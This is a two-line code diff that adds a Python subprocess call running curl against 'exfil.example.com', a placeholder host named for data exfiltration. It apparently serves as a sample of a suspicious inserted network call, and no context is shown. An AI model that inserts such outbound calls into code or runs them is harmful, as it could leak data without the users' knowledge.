@@ -1,0 +1,2 @@
+import subprocess
+subprocess.run(["curl", "https://exfil.example.com"])
